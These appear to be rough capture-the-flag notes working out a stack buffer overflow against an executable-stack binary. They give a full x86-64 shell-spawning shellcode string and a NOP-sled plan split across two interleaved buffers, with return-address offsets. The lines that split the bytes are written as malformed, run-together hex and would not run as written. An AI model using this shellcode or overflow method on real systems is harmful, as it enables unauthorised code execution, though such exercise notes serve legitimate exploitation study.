1. file compiled with execstack,  likely a shellcode buffer overflow.
2. buf1 and 2 terminated with 0, unlikely to be attack. use buf instead.

code:
buf[0] = buf1[0] + buf2[63]
buf[1] = buf1[63] + buf2[0]
buf[2] = buf1[1] + buf2[63]
...

- buf1[63] = buf2[63] = 0
- byte1/2 4 bytes gone, compare with each other -> noop sled?
- noop = 0x90
- shellcode: `\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05`
therefore:
buf2 = b"\x90" * 4 + 0xc00xbb0x9d0x910x8c0xff0xf70x530x5f0x520x540xb00xf
buf1 = b"\x90" * 4 + 0x310x480xd10x960xd00x970x480xdb0x540x990x570x5e0x3b0x5
receive input from stdout to get offset. pad buf12 w/ 0x90 to overflow retn
rip @958, buf @ 900